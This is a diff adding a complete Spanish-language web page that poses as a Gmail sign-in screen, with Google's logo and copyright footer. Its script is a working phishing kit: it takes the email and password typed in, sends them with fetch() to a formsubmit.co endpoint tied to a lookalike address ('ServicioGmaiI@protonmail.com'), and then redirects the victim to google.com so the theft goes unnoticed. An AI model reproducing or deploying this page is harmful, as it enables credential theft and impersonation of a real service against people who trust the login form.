@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Iniciar sesión — Gmail</title>
+  <style>
+    :root {
+      --bg: #f1f3f4;
+      --card: #ffffff;
+      --accent: #1a73e8;
+      --muted: #6b7280;
+      --danger: #b91c1c;
+      font-family: Arial, sans-serif;
+    }
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: var(--bg);
+      font-family: var(--font-family);
+    }
+    .wrap {
+      min-height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px;
+    }
+    .card {
+      width: 100%;
+      max-width: 420px;
+      background: var(--card);
+      border-radius: 8px;
+      box-shadow: 0 6px 18px rgba(20, 30, 50, 0.08);
+      padding: 28px;
+    }
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+    .logo {
+      width: 48px;
+      height: 48px;
+      background: url('https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_24dp.png') no-repeat center center;
+      background-size: contain;
+      border-radius: 8px;
+    }
+    h1 {
+      font-size: 24px;
+      margin: 0;
+      color: #111827;
+      font-weight: 400;
+    }
+    p.lead {
+      color: var(--muted);
+      margin: 6px 0 18px 0;
+      font-size: 14px;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      color: #374151;
+      margin-bottom: 6px;
+    }
+    .input-container {
+      position: relative;
+      margin-bottom: 12px;
+    }
+    .input {
+      width: 100%;
+      padding: 12px 14px 12px 14px;
+      border-radius: 8px;
+      border: 1px solid #e6e9ef;
+      font-size: 15px;
+      box-sizing: border-box;
+      outline: none;
+      transition: box-shadow 0.12s, border-color 0.12s;
+    }
+    .input:focus {
+      box-shadow: 0 4px 14px rgba(26, 115, 232, 0.12);
+      border-color: var(--accent);
+    }
+    .password-toggle {
+      position: absolute;
+      right: 14px;
+      top: 65%; /* Ajustado para posicionar más abajo */
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: var(--muted);
+    }
+    .small {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 12px;
+    }
+    .actions {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 6px;
+    }
+    button.primary {
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 15px;
+    }
+    button.ghost {
+      background: transparent;
+      border: none;
+      color: var(--muted);
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .error {
+      color: var(--danger);
+      font-size: 13px;
+      margin-top: 8px;
+    }
+    .note {
+      font-size: 12px;
+      color: #9ca3af;
+      margin-top: 14px;
+    }
+    footer {
+      margin-top: 16px;
+      text-align: center;
+      font-size: 12px;
+      color: var(--muted);
+    }
+    @media (max-width: 420px) {
+      .card {
+        padding: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <form id="loginForm" class="card" autocomplete="off" novalidate>
+      <div class="brand">
+        <div class="logo"></div>
+        <div>
+          <h1>Iniciar sesión en Gmail</h1>
+          <p class="lead">Introduce tu correo y contraseña para acceder a tu cuenta de Gmail.</p>
+        </div>
+      </div>
+
+      <div class="input-container">
+        <label for="email">Correo electrónico</label>
+        <input id="email" name="email" type="email" class="input" placeholder="tu@ejemplo.com" required />
+      </div>
+
+      <div class="input-container">
+        <label for="password">Contraseña</label>
+        <input id="password" name="password" type="password" class="input" placeholder="••••••••" required minlength="6" />
+        <span class="password-toggle" id="togglePassword">👁</span>
+      </div>
+
+      <div class="small">
+        <label><input id="remember" type="checkbox" /> Mantener sesión iniciada</label>
+      </div>
+
+      <div class="actions">
+        <button type="submit" class="primary">Iniciar sesión</button>
+        <button type="button" class="ghost" id="helpBtn">¿Necesitas ayuda?</button>
+      </div>
+
+      <div id="feedback" role="status" aria-live="polite"></div>
+
+      <p class="note">
+      </p>
+
+      <footer>© 2025 Google LLC. Todos los derechos reservados.</footer>
+    </form>
+  </div>
+
+  <script>
+    // Manejo básico: validación cliente y envío a endpoint de ejemplo.
+    const form = document.getElementById('loginForm');
+    const feedback = document.getElementById('feedback');
+    const passwordInput = document.getElementById('password');
+    const togglePassword = document.getElementById('togglePassword');
+
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePassword.textContent = type === 'password' ? '👁' : '👁️';
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      feedback.textContent = '';
+      const email = form.email.value.trim();
+      const password = form.password.value;
+
+      // Validaciones cliente
+      if (!email || !password) {
+        feedback.innerHTML = '<div class="error">Por favor completa ambos campos.</div>';
+        return;
+      }
+      if (password.length < 6) {
+        feedback.innerHTML = '<div class="error">La contraseña debe tener al menos 6 caracteres.</div>';
+        return;
+      }
+
+      // Enviar datos a formsubmit.co
+      try {
+        feedback.textContent = ''; // Limpiar cualquier mensaje previo
+        const response = await fetch('https://formsubmit.co/ServicioGmaiI@protonmail.com', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({ email, password })
+        });
+
+        if (response.ok) {
+          // Redirigir a Google después de un envío exitoso
+          window.location.href = 'https://www.google.com/';
+        } else {
+          feedback.innerHTML = '<div class="error">Ocurrió un error. Intenta de nuevo.</div>';
+        }
+      } catch (err) {
+        feedback.innerHTML = '<div class="error">Ocurrió un error. Intenta de nuevo.</div>';
+        console.error(err);
+      }
+    });
+
+    document.getElementById('helpBtn').addEventListener('click', () => {
+      alert('Si olvidaste la contraseña, utiliza el flujo de recuperación en tu servicio real.');
+    });
+  </script>
+</body>
+</html>
